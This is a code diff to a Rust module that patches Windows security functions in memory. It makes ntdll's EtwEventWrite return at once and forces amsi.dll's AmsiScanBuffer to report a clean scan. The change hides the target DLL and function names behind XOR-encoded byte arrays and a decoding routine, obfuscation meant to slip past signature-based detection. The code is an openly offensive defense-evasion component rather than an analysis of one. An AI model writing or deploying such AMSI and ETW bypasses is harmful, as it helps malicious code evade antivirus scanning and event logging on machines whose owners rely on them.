@@ -3,9 +3,24 @@
 //! Kernel callbacks and ETW-TI are not affected.
 #![allow(dead_code)]
 
-use windows::core::{s, PCSTR};
+use windows::core::PCSTR;
 use windows::Win32::System::LibraryLoader::{GetModuleHandleA, GetProcAddress};
 use windows::Win32::System::Memory::{VirtualProtect, PAGE_EXECUTE_READWRITE, PAGE_PROTECTION_FLAGS};
+
+const NTDLL: &[u8] = &[0x34, 0x0d, 0xfc, 0xdb, 0xba, 0xdb, 0x70, 0x5f, 0x3e];
+const ETW: &[u8] = &[0x1f, 0x0d, 0xef, 0xf2, 0xa0, 0x90, 0x7a, 0x47, 0x05, 0x03, 0xf9, 0xdb, 0xab];
+const AMSI: &[u8] = &[0x3b, 0x14, 0xeb, 0xde, 0xf8, 0x91, 0x78, 0x5f];
+const SCAN: &[u8] = &[0x1b, 0x14, 0xeb, 0xde, 0x85, 0x96, 0x75, 0x5d, 0x10, 0x04, 0xf6, 0xc9, 0xab, 0x9f];
+
+fn dec(data: &[u8]) -> Vec<u8> {
+    let mut v: Vec<u8> = data
+        .iter()
+        .enumerate()
+        .map(|(i, &b)| b ^ 0x5a_u8.wrapping_add((i as u8).wrapping_mul(31)))
+        .collect();
+    v.push(0);
+    v
+}
 
 fn resolve(dll: PCSTR, sym: PCSTR) -> Option<*mut core::ffi::c_void> {
     unsafe {
@@ -17,7 +32,9 @@ fn resolve(dll: PCSTR, sym: PCSTR) -> Option<*mut core::ffi::c_void> {
 /// Patch `ntdll!EtwEventWrite` with `ret`.
 pub fn patch_etw() {
     unsafe {
-        let Some(p) = resolve(s!("ntdll.dll"), s!("EtwEventWrite")) else {
+        let ntdll = dec(NTDLL);
+        let sym = dec(ETW);
+        let Some(p) = resolve(PCSTR(ntdll.as_ptr()), PCSTR(sym.as_ptr())) else {
             return;
         };
         let addr = p as *const core::ffi::c_void;
@@ -32,7 +49,9 @@ pub fn patch_etw() {
 /// Make `amsi.dll!AmsiScanBuffer` return E_INVALIDARG (`clean`).
 pub fn patch_amsi() {
     unsafe {
-        let Some(p) = resolve(s!("amsi.dll"), s!("AmsiScanBuffer")) else {
+        let amsi = dec(AMSI);
+        let sym = dec(SCAN);
+        let Some(p) = resolve(PCSTR(amsi.as_ptr()), PCSTR(sym.as_ptr())) else {
             return;
         };
         // mov eax, 0x80070057; ret
